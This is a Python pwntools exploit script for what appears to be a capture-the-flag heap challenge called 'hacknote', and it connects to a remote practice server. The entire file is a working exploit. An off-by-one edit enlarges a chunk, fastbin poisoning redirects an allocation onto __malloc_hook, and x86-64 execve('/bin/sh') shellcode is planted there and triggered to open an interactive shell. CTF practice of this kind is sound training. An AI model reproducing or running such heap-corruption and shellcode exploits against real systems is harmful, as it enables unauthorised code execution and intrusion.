from pwn import *

#p = process('./huxiangbei_2019_hacknote')
p = remote('node4.buuoj.cn', 27728)

#context.log_level = 'debug'
context.arch = 'amd64'

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, s)

def alloc(size, content):
    sla(b'-----------------', b'1')
    sla(b'Size:', str(size).encode())
    sa(b'Note:', content)

def delete(index):
    sla(b'-----------------', b'2')
    sla(b'Note:', str(index).encode())

def edit(index, content):
    sla(b'-----------------', b'3')
    sla(b'Note:', str(index).encode())
    sa(b'Note:', content)

#data segmenet can be executed
malloc_hook = 0x6cb788

alloc(0x18, b'\n') #0
alloc(0x38, b'\n') #1
alloc(0x38, b'\n') #2
alloc(0x18, b'\n') #3

edit(0, b'a' * 0x18)
edit(0, b'a' * 0x18 + b'\x81')

delete(2)
delete(1)

alloc(0x70, b'a' * 0x38 + p64(0x41) + p64(malloc_hook - 0x16) + b'\n')

alloc(0x38, b'\n')

shellcode = b'\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'

alloc(0x38, b'a' * 0x6 + p64(malloc_hook + 8) + shellcode + b'\n')

#debug('b *0x400bf8')
sla(b'-----------------', b'1')
sla(b'Size:', b'a')

p.interactive()